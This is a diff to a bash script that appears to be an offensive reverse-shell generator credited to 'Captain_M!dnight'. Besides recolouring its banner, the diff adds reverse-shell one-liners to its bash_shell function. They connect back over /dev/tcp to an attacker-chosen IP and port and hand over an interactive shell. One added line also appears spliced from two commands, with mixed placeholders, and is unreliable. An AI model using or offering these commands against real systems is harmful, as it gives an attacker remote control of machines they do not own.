@@ -27,9 +27,9 @@ neg="[${Red}-${Color_Off}]"
 function ascii_art(){
 
 	echo -e """
-${Red}╔═╗${Green}┬ ┬┌─┐┬  ┬    ${Green}╦  ${Red}┌─┐┬  ┬┌─┐┬─┐
-${Red}╚═╗${Green}├─┤├┤ │  │    ${Green}║  ${Red}│ │└┐┌┘├┤ ├┬┘
-${Red}╚═╝${Green}┴ ┴└─┘┴─┘┴─┘  ${Green}╩═╝${Red}└─┘ └┘ └─┘┴└─   
+${Red}╔═╗${Green}┬ ┬┌─┐┬  ┬    ${Red}╦  ┌─┐┬  ┬┌─┐┬─┐
+${Red}╚═╗${Green}├─┤├┤ │  │    ${Red}║  │ │└┐┌┘├┤ ├┬┘
+${Red}╚═╝${Green}┴ ┴└─┘┴─┘┴─┘  ${Red}╩═╝└─┘ └┘ └─┘┴└─   
 ${IWhite}Author : Captain_M!dnight	
 [${Red}NOTICE${Color_Off}]Texts in red are changable
 ${Color_Off}"""
@@ -83,7 +83,10 @@ function reverse_shell_list(){
 
 function bash_shell(){
 
-	echo -e "${pos}${Yellow}Bash shell:${Color_Off} bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
+	echo -e "${pos}${Yellow}Bash shell:${Color_Off}"
+	echo -e "bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
+	echo -e "exec 5<>/dev/tcp/${Red}$ipaddr/$port${Color_Off};cat <&5 | while read line; do $line 2>&5 >&5; done"
+	echo -e "exec /bin/sh 0</dev/tcp/${Red}$ipaddr/$port${Color_Off} 1>&0 2>&0 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"
 }
 
 function perl_shell(){
